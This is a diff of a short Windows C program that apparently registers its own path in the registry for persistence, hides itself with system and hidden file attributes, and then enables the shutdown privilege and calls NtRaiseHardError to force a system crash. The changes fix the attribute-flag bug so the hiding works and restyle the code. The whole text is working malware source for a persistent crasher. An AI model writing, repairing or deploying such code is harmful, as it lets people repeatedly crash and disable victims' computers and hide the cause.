@@ -1,14 +1,13 @@
-// Coded by DosX-dev (GitHub)
+// кодед бай доска икс (!!!)
 
-#include <windows.h>
 #include <stdio.h>
 #include <tchar.h>
+#include <windows.h>
 #define NT_ERROR_CODE 0xC0000022
 
 int APIENTRY WinMain(
     HINSTANCE hInstance, HINSTANCE hPrevInstance,
-    LPSTR lpCmdLine, int nCmdShow)
-{
+    LPSTR lpCmdLine, int nCmdShow) {
     TCHAR szFilePath[MAX_PATH];
     GetModuleFileName(NULL, szFilePath, MAX_PATH);
 
@@ -21,14 +20,13 @@ int APIENTRY WinMain(
                       0x00, REG_SZ, (LPBYTE)szFilePath, (DWORD)(_tcslen(szFilePath) + 1) * sizeof(TCHAR));
     RegCloseKey(hKey);
 
-    SetFileAttributesA(szFilePath, FILE_ATTRIBUTE_SYSTEM || FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributesA(szFilePath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED | FILE_ATTRIBUTE_READONLY);
 
     BOOLEAN previousValue;
     ULONG response;
 
-    if (RtlAdjustPrivilege(0x13, // [SeShutdownPrivilege]
-                           TRUE, FALSE, &previousValue) == 0x00)
-    {
+    if (RtlAdjustPrivilege(0x13,  // [SeShutdownPrivilege]
+                           TRUE, FALSE, &previousValue) == 0x00) {
         // 0110 = 01 10 = [ResponseOptionOk + ResponseOptionCancel]
         NtRaiseHardError(NT_ERROR_CODE, 0x00, 0x00, NULL, 0b0110, &response);
     }
